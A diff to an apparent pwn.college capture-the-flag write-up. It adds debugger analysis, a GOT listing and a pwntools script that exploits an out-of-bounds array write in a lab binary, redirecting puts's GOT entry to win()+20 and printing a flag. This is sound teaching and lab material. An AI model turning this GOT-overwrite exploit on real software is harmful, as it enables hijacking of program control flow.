@@ -4661,7 +4661,7 @@ Since this challenge has only `Partial RELRO` enabled, we can perform a GOT over
 
 We have to replace the GOT entry of some library, with the address of `win()`.
 
-#### GOT
+### GOT
 
 #### Pre resolution
 
@@ -4720,7 +4720,7 @@ Non-debugging symbols:
 0x0000000000002998  _fini
 ```
 
-Let's look at the GOT.
+Let's look at the GOT. For this the progrm will have to be run, so set a breakpoint at `main()` and run.
 
 ```
 pwndbg> got
@@ -4993,7 +4993,7 @@ from pwn import *
 p = process('/challenge/now-you-got-it-easy')
 
 p.recvuntil(b"The array starts at ")
-array_start = int(p.recvuntil(b",", drop=True), 16)
+array_addr = int(p.recvuntil(b",", drop=True), 16)
 
 p.recvuntil(b"The GOT (global offset table) is located at  ")
 got_base = int(p.recvline().strip(), 16)
@@ -5001,8 +5001,8 @@ got_base = int(p.recvline().strip(), 16)
 p.recvuntil(b"FREE LEAK: win is located at: ")
 win_addr = int(p.recvline().strip(), 16)
 
-target_addr = got_base + 0x18
-index = (target_addr - array_start) // 8
+putschar_got_addr = got_base + 0x18
+index = (putschar_got_addr - array_addr) // 8
 
 p.sendlineafter(b"view?", str(index).encode())
 p.sendlineafter(b"with?", str(win_addr).encode())
@@ -5033,9 +5033,171 @@ $
 ## Now you got it (Hard)
 
 ```
-array: 0x5f712b704200
-got addr: 0x5f712b702000
-win addr: 0x5f712b700f38
+hacker@program-security~now-you-got-it-hard:~$ /challenge/now-you-got-it-hard 
+FREE LEAK: win is located at: 0x57d1d91aef38
+
+Which number would you like to view? 0
+Your hacker number is ffffffffdeadbeef
+What number would you like to replace it with? 1234
+Goodbye!
+```
+
+We need the following in order to craft an exploit.
+
+- [ ] Location of the GOT entry for `puts`
+- [ ] Location of the array
+
+```
+hacker@program-security~now-you-got-it-hard:~$ checksec /challenge/now-you-got-it-hard 
+[*] '/challenge/now-you-got-it-hard'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+This time as well the challenge has `Partial RELRO` enabled.
+
+### Binary Analysis
+
+Let's which GOT entries we can overwrite.
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x000000000000203f <+0>:     endbr64
+   0x0000000000002043 <+4>:     push   rbp
+   0x0000000000002044 <+5>:     mov    rbp,rsp
+   0x0000000000002047 <+8>:     sub    rsp,0x110
+   0x000000000000204e <+15>:    mov    DWORD PTR [rbp-0xf4],edi
+   0x0000000000002054 <+21>:    mov    QWORD PTR [rbp-0x100],rsi
+   0x000000000000205b <+28>:    mov    QWORD PTR [rbp-0x108],rdx
+   0x0000000000002062 <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x000000000000206b <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000206f <+48>:    xor    eax,eax
+   0x0000000000002071 <+50>:    mov    QWORD PTR [rbp-0x90],0x0
+   0x000000000000207c <+61>:    mov    QWORD PTR [rbp-0x88],0x0
+   0x0000000000002087 <+72>:    mov    QWORD PTR [rbp-0x80],0x0
+   0x000000000000208f <+80>:    mov    QWORD PTR [rbp-0x78],0x0
+   0x0000000000002097 <+88>:    mov    QWORD PTR [rbp-0x70],0x0
+   0x000000000000209f <+96>:    mov    QWORD PTR [rbp-0x68],0x0
+   0x00000000000020a7 <+104>:   mov    QWORD PTR [rbp-0x60],0x0
+   0x00000000000020af <+112>:   mov    QWORD PTR [rbp-0x58],0x0
+   0x00000000000020b7 <+120>:   mov    QWORD PTR [rbp-0x50],0x0
+   0x00000000000020bf <+128>:   mov    QWORD PTR [rbp-0x48],0x0
+   0x00000000000020c7 <+136>:   mov    QWORD PTR [rbp-0x40],0x0
+   0x00000000000020cf <+144>:   mov    QWORD PTR [rbp-0x38],0x0
+   0x00000000000020d7 <+152>:   mov    QWORD PTR [rbp-0x30],0x0
+   0x00000000000020df <+160>:   mov    QWORD PTR [rbp-0x28],0x0
+   0x00000000000020e7 <+168>:   mov    QWORD PTR [rbp-0x20],0x0
+   0x00000000000020ef <+176>:   mov    DWORD PTR [rbp-0x18],0x0
+   0x00000000000020f6 <+183>:   mov    WORD PTR [rbp-0x14],0x0
+   0x00000000000020fc <+189>:   mov    QWORD PTR [rbp-0xe8],0x0
+   0x0000000000002107 <+200>:   mov    QWORD PTR [rbp-0xe8],0x1000
+   0x0000000000002112 <+211>:   mov    DWORD PTR [rbp-0xe0],0xdeadbeef
+   0x000000000000211c <+221>:   mov    DWORD PTR [rbp-0xdc],0x1337c0de
+   0x0000000000002126 <+231>:   mov    DWORD PTR [rbp-0xd8],0xfaceb00c
+   0x0000000000002130 <+241>:   mov    DWORD PTR [rbp-0xd4],0xfeedface
+   0x000000000000213a <+251>:   mov    DWORD PTR [rbp-0xd0],0x8badf00d
+   0x0000000000002144 <+261>:   mov    DWORD PTR [rbp-0xcc],0x1337
+   0x000000000000214e <+271>:   mov    DWORD PTR [rbp-0xc8],0xc0ffee
+   0x0000000000002158 <+281>:   mov    DWORD PTR [rbp-0xc4],0xf00dbeef
+   0x0000000000002162 <+291>:   mov    DWORD PTR [rbp-0xc0],0x1337beef
+   0x000000000000216c <+301>:   mov    DWORD PTR [rbp-0xbc],0xb00cdead
+   0x0000000000002176 <+311>:   mov    DWORD PTR [rbp-0xb8],0xface1337
+   0x0000000000002180 <+321>:   mov    DWORD PTR [rbp-0xb4],0xcafebabe
+   0x000000000000218a <+331>:   mov    DWORD PTR [rbp-0xb0],0xbaadf00d
+   0x0000000000002194 <+341>:   mov    DWORD PTR [rbp-0xac],0x600d1dea
+   0x000000000000219e <+351>:   mov    DWORD PTR [rbp-0xa8],0xbadc0de
+   0x00000000000021a8 <+361>:   mov    DWORD PTR [rbp-0xa4],0xdead10cc
+   0x00000000000021b2 <+371>:   mov    DWORD PTR [rbp-0xa0],0xbadcab1e
+   0x00000000000021bc <+381>:   mov    DWORD PTR [rbp-0x9c],0xddba11
+   0x00000000000021c6 <+391>:   mov    DWORD PTR [rbp-0xec],0x0
+   0x00000000000021d0 <+401>:   jmp    0x2235 <challenge+502>
+   0x00000000000021d2 <+403>:   mov    eax,DWORD PTR [rbp-0xec]
+   0x00000000000021d8 <+409>:   movsxd rcx,eax
+   0x00000000000021db <+412>:   movabs rdx,0xe38e38e38e38e38f
+   0x00000000000021e5 <+422>:   mov    rax,rcx
+   0x00000000000021e8 <+425>:   mul    rdx
+   0x00000000000021eb <+428>:   shr    rdx,0x4
+   0x00000000000021ef <+432>:   mov    rax,rdx
+   0x00000000000021f2 <+435>:   shl    rax,0x3
+   0x00000000000021f6 <+439>:   add    rax,rdx
+   0x00000000000021f9 <+442>:   add    rax,rax
+   0x00000000000021fc <+445>:   sub    rcx,rax
+   0x00000000000021ff <+448>:   mov    rdx,rcx
+   0x0000000000002202 <+451>:   mov    eax,DWORD PTR [rbp+rdx*4-0xe0]
+   0x0000000000002209 <+458>:   cdqe
+   0x000000000000220b <+460>:   mov    edx,DWORD PTR [rbp-0xec]
+   0x0000000000002211 <+466>:   movsxd rdx,edx
+   0x0000000000002214 <+469>:   add    rdx,0x190
+   0x000000000000221b <+476>:   lea    rcx,[rdx*8+0x0]
+   0x0000000000002223 <+484>:   lea    rdx,[rip+0x2fde]        # 0x5208 <bssdata+8>
+   0x000000000000222a <+491>:   mov    QWORD PTR [rcx+rdx*1],rax
+   0x000000000000222e <+495>:   add    DWORD PTR [rbp-0xec],0x1
+   0x0000000000002235 <+502>:   cmp    DWORD PTR [rbp-0xec],0x7d
+   0x000000000000223c <+509>:   jle    0x21d2 <challenge+403>
+   0x000000000000223e <+511>:   lea    rsi,[rip+0xfffffffffffffcf3]        # 0x1f38 <win>
+   0x0000000000002245 <+518>:   lea    rdi,[rip+0xec4]        # 0x3110
+   0x000000000000224c <+525>:   mov    eax,0x0
+   0x0000000000002251 <+530>:   call   0x1140 <printf@plt>
+   0x0000000000002256 <+535>:   mov    DWORD PTR [rbp-0xf0],0x0
+   0x0000000000002260 <+545>:   lea    rdi,[rip+0xed1]        # 0x3138
+   0x0000000000002267 <+552>:   mov    eax,0x0
+   0x000000000000226c <+557>:   call   0x1140 <printf@plt>
+   0x0000000000002271 <+562>:   lea    rax,[rbp-0xf0]
+   0x0000000000002278 <+569>:   mov    rsi,rax
+   0x000000000000227b <+572>:   lea    rdi,[rip+0xedc]        # 0x315e
+   0x0000000000002282 <+579>:   mov    eax,0x0
+   0x0000000000002287 <+584>:   call   0x1190 <__isoc99_scanf@plt>
+   0x000000000000228c <+589>:   mov    eax,DWORD PTR [rbp-0xf0]
+   0x0000000000002292 <+595>:   cdqe
+   0x0000000000002294 <+597>:   add    rax,0x190
+   0x000000000000229a <+603>:   lea    rdx,[rax*8+0x0]
+   0x00000000000022a2 <+611>:   lea    rax,[rip+0x2f5f]        # 0x5208 <bssdata+8>
+   0x00000000000022a9 <+618>:   mov    rax,QWORD PTR [rdx+rax*1]
+   0x00000000000022ad <+622>:   mov    rsi,rax
+   0x00000000000022b0 <+625>:   lea    rdi,[rip+0xeaa]        # 0x3161
+   0x00000000000022b7 <+632>:   mov    eax,0x0
+   0x00000000000022bc <+637>:   call   0x1140 <printf@plt>
+   0x00000000000022c1 <+642>:   lea    rdi,[rip+0xeb8]        # 0x3180
+   0x00000000000022c8 <+649>:   mov    eax,0x0
+   0x00000000000022cd <+654>:   call   0x1140 <printf@plt>
+   0x00000000000022d2 <+659>:   mov    eax,DWORD PTR [rbp-0xf0]
+   0x00000000000022d8 <+665>:   cdqe
+   0x00000000000022da <+667>:   add    rax,0x190
+   0x00000000000022e0 <+673>:   lea    rdx,[rax*8+0x0]
+   0x00000000000022e8 <+681>:   lea    rax,[rip+0x2f11]        # 0x5200 <bssdata>
+   0x00000000000022ef <+688>:   add    rax,rdx
+   0x00000000000022f2 <+691>:   add    rax,0x8
+   0x00000000000022f6 <+695>:   mov    rsi,rax
+   0x00000000000022f9 <+698>:   lea    rdi,[rip+0xeb0]        # 0x31b0
+   0x0000000000002300 <+705>:   mov    eax,0x0
+   0x0000000000002305 <+710>:   call   0x1190 <__isoc99_scanf@plt>
+   0x000000000000230a <+715>:   lea    rdi,[rip+0xea4]        # 0x31b5
+   0x0000000000002311 <+722>:   call   0x1110 <puts@plt>
+   0x0000000000002316 <+727>:   mov    eax,0x0
+   0x000000000000231b <+732>:   mov    rsi,QWORD PTR [rbp-0x8]
+   0x000000000000231f <+736>:   xor    rsi,QWORD PTR fs:0x28
+   0x0000000000002328 <+745>:   je     0x232f <challenge+752>
+   0x000000000000232a <+747>:   call   0x1130 <__stack_chk_fail@plt>
+   0x000000000000232f <+752>:   leave
+   0x0000000000002330 <+753>:   ret
+End of assembler dump.
+```
+
+We can see that after reading our input, two PLT stubs are called. `puts@plt` at `challenge+710`, and `__stack_chk_fail@plt` at `challenge+747`.
+Let's check what the addresses of the GOT entries are for these functions. For this the program will have to be run.
+
+```
+pwndbg> break main
+Breakpoint 1 at 0x2339
 ```
 
 ```
@@ -5044,18 +5206,195 @@ Filtering out read-only entries (display them with -r or --show-readonly)
 
 State of the GOT of /challenge/now-you-got-it-hard:
 GOT protection: Partial RELRO | Found 12 GOT entries passing the filter
-[0x5f712b704018] __errno_location@GLIBC_2.2.5 -> 0x5f712b700030 ◂— endbr64 
-[0x5f712b704020] puts@GLIBC_2.2.5 -> 0x5f712b700040 ◂— endbr64 
-[0x5f712b704028] write@GLIBC_2.2.5 -> 0x5f712b700050 ◂— endbr64 
-[0x5f712b704030] __stack_chk_fail@GLIBC_2.4 -> 0x5f712b700060 ◂— endbr64 
-[0x5f712b704038] printf@GLIBC_2.2.5 -> 0x767aec149c90 (printf) ◂— endbr64 
-[0x5f712b704040] geteuid@GLIBC_2.2.5 -> 0x5f712b700080 ◂— endbr64 
-[0x5f712b704048] read@GLIBC_2.2.5 -> 0x5f712b700090 ◂— endbr64 
-[0x5f712b704050] setvbuf@GLIBC_2.2.5 -> 0x767aec16cce0 (setvbuf) ◂— endbr64 
-[0x5f712b704058] open@GLIBC_2.2.5 -> 0x5f712b7000b0 ◂— endbr64 
-[0x5f712b704060] __isoc99_scanf@GLIBC_2.7 -> 0x767aec14b0b0 (__isoc99_scanf) ◂— endbr64 
-[0x5f712b704068] exit@GLIBC_2.2.5 -> 0x5f712b7000d0 ◂— endbr64 
-[0x5f712b704070] strerror@GLIBC_2.2.5 -> 0x5f712b7000e0 ◂— endbr64 
+[0x61547e762018] __errno_location@GLIBC_2.2.5 -> 0x61547e75e030 ◂— endbr64 
+[0x61547e762020] puts@GLIBC_2.2.5 -> 0x61547e75e040 ◂— endbr64 
+[0x61547e762028] write@GLIBC_2.2.5 -> 0x61547e75e050 ◂— endbr64 
+[0x61547e762030] __stack_chk_fail@GLIBC_2.4 -> 0x61547e75e060 ◂— endbr64 
+[0x61547e762038] printf@GLIBC_2.2.5 -> 0x61547e75e070 ◂— endbr64 
+[0x61547e762040] geteuid@GLIBC_2.2.5 -> 0x61547e75e080 ◂— endbr64 
+[0x61547e762048] read@GLIBC_2.2.5 -> 0x61547e75e090 ◂— endbr64 
+[0x61547e762050] setvbuf@GLIBC_2.2.5 -> 0x61547e75e0a0 ◂— endbr64 
+[0x61547e762058] open@GLIBC_2.2.5 -> 0x61547e75e0b0 ◂— endbr64 
+[0x61547e762060] __isoc99_scanf@GLIBC_2.7 -> 0x61547e75e0c0 ◂— endbr64 
+[0x61547e762068] exit@GLIBC_2.2.5 -> 0x61547e75e0d0 ◂— endbr64 
+[0x61547e762070] strerror@GLIBC_2.2.5 -> 0x61547e75e0e0 ◂— endbr64 
+```
+
+- [x] Location of the GOT entry for `puts`: `0x61547e762020`
+- [ ] Location of the array
+
+Now, let's set a breakpoint at `challenge+695`, and get the address of the array.
+
+```
+pwndbg> break *(challenge+695)
+Breakpoint 2 at 0x61547e75f2f6
+```
+
+```
+pwndbg> c
+
+Which number would you like to view? 0
+Your hacker number is ffffffffdeadbeef
+What number would you like to replace it with? 
+Breakpoint 2, 0x000061547e75f2f6 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x61547e762e88 (bssdata+3208) ◂— 0xffffffffdeadbeef
+ RBX  0x61547e75f3f0 (__libc_csu_init) ◂— endbr64 
+*RCX  0
+*RDX  0xc80
+*RDI  0x7f969915f7e0 (_IO_stdfile_1_lock) ◂— 0
+*RSI  0x7fff0f95f020 ◂— 'What number would you like to replace it with? '
+*R8   0x2f
+*R9   0x2f
+*R10  0x61547e760180 ◂— 'What number would you like to replace it with? '
+*R11  0x246
+ R12  0x61547e75e1c0 (_start) ◂— endbr64 
+ R13  0x7fff0f962900 ◂— 1
+ R14  0
+ R15  0
+*RBP  0x7fff0f9617d0 —▸ 0x7fff0f962810 ◂— 0
+*RSP  0x7fff0f9616c0 ◂— 0
+*RIP  0x61547e75f2f6 (challenge+695) ◂— mov rsi, rax
+───────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x61547e75f2f6 <challenge+695>    mov    rsi, rax               RSI => 0x61547e762e88 (bssdata+3208) ◂— 0xffffffffdeadbeef
+   0x61547e75f2f9 <challenge+698>    lea    rdi, [rip + 0xeb0]     RDI => 0x61547e7601b0 ◂— 0x6f6f4700646c6c25 /* '%lld' */
+   0x61547e75f300 <challenge+705>    mov    eax, 0                 EAX => 0
+   0x61547e75f305 <challenge+710>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
+ 
+   0x61547e75f30a <challenge+715>    lea    rdi, [rip + 0xea4]     RDI => 0x61547e7601b5 ◂— 'Goodbye!'
+   0x61547e75f311 <challenge+722>    call   puts@plt                    <puts@plt>
+ 
+   0x61547e75f316 <challenge+727>    mov    eax, 0                       EAX => 0
+   0x61547e75f31b <challenge+732>    mov    rsi, qword ptr [rbp - 8]
+   0x61547e75f31f <challenge+736>    xor    rsi, qword ptr fs:[0x28]
+   0x61547e75f328 <challenge+745>    je     challenge+752               <challenge+752>
+ 
+   0x61547e75f32a <challenge+747>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff0f9616c0 ◂— 0
+01:0008│-108 0x7fff0f9616c8 —▸ 0x7fff0f962918 —▸ 0x7fff0f964aad ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-100 0x7fff0f9616d0 —▸ 0x7fff0f962908 —▸ 0x7fff0f964a8e ◂— '/challenge/now-you-got-it-hard'
+03:0018│-0f8 0x7fff0f9616d8 ◂— 0x100000000
+04:0020│-0f0 0x7fff0f9616e0 ◂— 0x7e00000000
+05:0028│-0e8 0x7fff0f9616e8 ◂— 0x1000
+06:0030│-0e0 0x7fff0f9616f0 ◂— 0x1337c0dedeadbeef
+07:0038│-0d8 0x7fff0f9616f8 ◂— 0xfeedfacefaceb00c
+──────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x61547e75f2f6 challenge+695
+   1   0x61547e75f3c6 main+149
+   2   0x7f9698f95083 __libc_start_main+243
+   3   0x61547e75e1ee _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the GOT entry for `puts`: `0x61547e762020`
+- [x] Location of the array: `0x61547e762e88`
+
+Finally, we have to see if `win()` call `puts@plt` before printing our flag, and skip that part of the code.
+
+```
+pwndbg> disassemble win
+Dump of assembler code for function win:
+   0x000061547e75ef38 <+0>:     endbr64
+   0x000061547e75ef3c <+4>:     push   rbp
+   0x000061547e75ef3d <+5>:     mov    rbp,rsp
+   0x000061547e75ef40 <+8>:     lea    rdi,[rip+0x10c1]        # 0x61547e760008
+   0x000061547e75ef47 <+15>:    call   0x61547e75e110 <puts@plt>
+   0x000061547e75ef4c <+20>:    mov    esi,0x0
+   0x000061547e75ef51 <+25>:    lea    rdi,[rip+0x10cc]        # 0x61547e760024
+   0x000061547e75ef58 <+32>:    mov    eax,0x0
+   0x000061547e75ef5d <+37>:    call   0x61547e75e180 <open@plt>
+   0x000061547e75ef62 <+42>:    mov    DWORD PTR [rip+0x3158],eax        # 0x61547e7620c0 <flag_fd.5700>
+   0x000061547e75ef68 <+48>:    mov    eax,DWORD PTR [rip+0x3152]        # 0x61547e7620c0 <flag_fd.5700>
+   0x000061547e75ef6e <+54>:    test   eax,eax
+   0x000061547e75ef70 <+56>:    jns    0x61547e75efbf <win+135>
+   0x000061547e75ef72 <+58>:    call   0x61547e75e100 <__errno_location@plt>
+   0x000061547e75ef77 <+63>:    mov    eax,DWORD PTR [rax]
+   0x000061547e75ef79 <+65>:    mov    edi,eax
+   0x000061547e75ef7b <+67>:    call   0x61547e75e1b0 <strerror@plt>
+   0x000061547e75ef80 <+72>:    mov    rsi,rax
+   0x000061547e75ef83 <+75>:    lea    rdi,[rip+0x10a6]        # 0x61547e760030
+   0x000061547e75ef8a <+82>:    mov    eax,0x0
+   0x000061547e75ef8f <+87>:    call   0x61547e75e140 <printf@plt>
+   0x000061547e75ef94 <+92>:    call   0x61547e75e150 <geteuid@plt>
+   0x000061547e75ef99 <+97>:    test   eax,eax
+   0x000061547e75ef9b <+99>:    je     0x61547e75efb5 <win+125>
+   0x000061547e75ef9d <+101>:   lea    rdi,[rip+0x10bc]        # 0x61547e760060
+   0x000061547e75efa4 <+108>:   call   0x61547e75e110 <puts@plt>
+   0x000061547e75efa9 <+113>:   lea    rdi,[rip+0x10d8]        # 0x61547e760088
+   0x000061547e75efb0 <+120>:   call   0x61547e75e110 <puts@plt>
+   0x000061547e75efb5 <+125>:   mov    edi,0xffffffff
+   0x000061547e75efba <+130>:   call   0x61547e75e1a0 <exit@plt>
+   0x000061547e75efbf <+135>:   mov    eax,DWORD PTR [rip+0x30fb]        # 0x61547e7620c0 <flag_fd.5700>
+   0x000061547e75efc5 <+141>:   mov    edx,0x100
+   0x000061547e75efca <+146>:   lea    rsi,[rip+0x310f]        # 0x61547e7620e0 <flag.5699>
+   0x000061547e75efd1 <+153>:   mov    edi,eax
+   0x000061547e75efd3 <+155>:   call   0x61547e75e160 <read@plt>
+   0x000061547e75efd8 <+160>:   mov    DWORD PTR [rip+0x3202],eax        # 0x61547e7621e0 <flag_length.5701>
+   0x000061547e75efde <+166>:   mov    eax,DWORD PTR [rip+0x31fc]        # 0x61547e7621e0 <flag_length.5701>
+   0x000061547e75efe4 <+172>:   test   eax,eax
+   0x000061547e75efe6 <+174>:   jg     0x61547e75f014 <win+220>
+   0x000061547e75efe8 <+176>:   call   0x61547e75e100 <__errno_location@plt>
+   0x000061547e75efed <+181>:   mov    eax,DWORD PTR [rax]
+   0x000061547e75efef <+183>:   mov    edi,eax
+   0x000061547e75eff1 <+185>:   call   0x61547e75e1b0 <strerror@plt>
+   0x000061547e75eff6 <+190>:   mov    rsi,rax
+   0x000061547e75eff9 <+193>:   lea    rdi,[rip+0x10e0]        # 0x61547e7600e0
+   0x000061547e75f000 <+200>:   mov    eax,0x0
+   0x000061547e75f005 <+205>:   call   0x61547e75e140 <printf@plt>
+   0x000061547e75f00a <+210>:   mov    edi,0xffffffff
+   0x000061547e75f00f <+215>:   call   0x61547e75e1a0 <exit@plt>
+   0x000061547e75f014 <+220>:   mov    eax,DWORD PTR [rip+0x31c6]        # 0x61547e7621e0 <flag_length.5701>
+   0x000061547e75f01a <+226>:   cdqe
+   0x000061547e75f01c <+228>:   mov    rdx,rax
+   0x000061547e75f01f <+231>:   lea    rsi,[rip+0x30ba]        # 0x61547e7620e0 <flag.5699>
+   0x000061547e75f026 <+238>:   mov    edi,0x1
+   0x000061547e75f02b <+243>:   call   0x61547e75e120 <write@plt>
+   0x000061547e75f030 <+248>:   lea    rdi,[rip+0x10d3]        # 0x61547e76010a
+   0x000061547e75f037 <+255>:   call   0x61547e75e110 <puts@plt>
+   0x000061547e75f03c <+260>:   nop
+   0x000061547e75f03d <+261>:   pop    rbp
+   0x000061547e75f03e <+262>:   ret
+End of assembler dump.
+```
+
+- [x] Location of the GOT entry for `puts`: `0x61547e762020`
+- [x] Location of the array: `0x61547e762e88`
+- [x] Offset inside `win()` which skips the `puts@plt` call before leaking flag: `20`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Initialize values
+array_addr = 0x61547e762e88
+puts_got_addr = 0x61547e762020
+
+# Calculate offset and index
+offset = puts_got_addr - array_addr
+index = offset // 8
+
+p = process('/challenge/now-you-got-it-hard')
+
+# Extract relevant values
+p.recvuntil(b"FREE LEAK: win is located at: ")
+win_addr = int(p.recvline().strip(), 16)
+safe_win_addr = win_addr + 20
+
+p.sendlineafter(b"view?", str(index).encode())
+p.sendlineafter(b"with?", str(safe_win_addr).encode())
+
+p.interactive()
+```
+
+```
+hacker@program-security~now-you-got-it-hard:~$ python ~/script.pyclear
+
+# ---- snip ----
+
+pwn.college{wS9b_4nt9UBct057CQ2Art0EafV.QX3gzN4EDL4ITM0EzW}
 ```
 
 &nbsp;
